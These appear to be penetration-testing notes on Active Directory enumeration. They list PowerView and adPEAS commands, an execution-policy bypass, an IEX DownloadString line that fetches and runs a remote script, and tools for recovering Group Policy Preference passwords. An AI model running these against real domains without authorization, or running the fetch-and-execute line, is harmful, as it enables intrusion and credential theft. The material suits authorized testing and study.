# PowerView
```powershell
# First we  need to shutdown execution policy using powershell
powershell -ep (or -ExecutionPolicy ) bypass
. .\ PowerView.ps1
| select OPTION # it's like grep in linux
 Domain
	Get-NetDomain # prints info about Domain
	Get-NetDomainController # points at DC 
	Get-DomainPolicy # shows policies
	(Get-DomainPolicy)."system access" # More info about policies 

 Users
	Get-netuser # prints all users inside the domain 
	Get-netuser | select cn # prints only users names
	Get-netuser | select samaccountname  # prints only users names
	Get-netuser | select description # prints all users description
	Get-UserProperty # show all users properties
	Get-UserProperty -Properties <OPTION> # filter properties by  
	Get-UserProperty -Properties pwdlastset # filter properties for pwdlastset - Prints all users last password set
	Get-UserProperty -Properties logoncount # prints users logon count (Avoid accounts that has 0 logon maybe honeypot)
	Get-UserProperty -Properties badpwd # prints bad password count 

Computers
	Get-NetComputer # Shows computers in the domain 
	Get-NetComputer -FullData # more info about computers
	Get-NetComputer -FullData | select OperatingSystem # prints only operating system info for computers in the domain 
	Get-ComputerInfo #Prints all info about the system 
	Get-DomainComputer COMPUTER_NAME # check for computer on domain

Groups
	Get-NetGroup # print groups 
	Get-NetGroup -GroupName "Domain Admins" # search for domain group names
	Get-NetGroup -GroupName *admin* # wildcard search 
	Get-NetGroupMember -GroupName "Domain Admins" # same options but prints memebers of the group

Shares
	Invoke-ShareFinder # prints all shares


GroupPolicies
	Get-NetGPO # prints group policies
	Get-NetGPO | select displayname, whenchanged # prints displayname and whenchanged from Get-NetGPO
```


# adPEAS 
https://github.com/61106960/adPEAS

start using one of the following:
```
Import-Module .\adPEAS.ps1
```
or
```
. . \adPEAS.ps1
```
or
```
gc -raw .\adPEAS.ps1 | iex
```
or
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
```

after starting adpeas we can then start enumerating 
start adPEAS with all enumeration modules and enumerate the domain the logged-on user and computer is connected to.

```
Invoke-adPEAS
```

Start adPEAS with all enumeration modules and enumerate the domain 'contoso.com'.

```
Invoke-adPEAS -Domain 'contoso.com' -Server 'dc1.contoso.com'
```

Start adPEAS with all enumeration modules, enumerate the domain 'contoso.com' and use the domain controller 'dc1.contoso.com' for almost all enumeration requests.

```
Invoke-adPEAS -Domain 'contoso.com' -Server 'dc1.contoso.com'
```

Start adPEAS with all enumeration modules, enumerate the domain 'contoso.com' and use the passed PSCredential object during enumeration.
```
$SecPassword = ConvertTo-SecureString 'Passw0rd1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('contoso\johndoe', $SecPassword)
Invoke-adPEAS -Domain 'contoso.com' -Cred $Cred
```


Start adPEAS with all enumeration modules, enumerate the domain 'contoso.com' and use the username 'contoso\johndoe' with password 'Passw0rd1!' during enumeration.

```
Invoke-adPEAS -Domain contoso.com -Username 'contoso\johndoe' -Password 'Passw0rd1!'
```





# check for gpp / cPassword attack


## invoke-gpp

[Invoke-gpp](https://github.com/vysecurity/ps1-toolkit/blob/master/Invoke-GPPPassword.ps1)


## Metasploit
```
smb_enum_gpp moudle 
```

## gpp-decrypt
```bash
gpp-decrypt <HASH>
```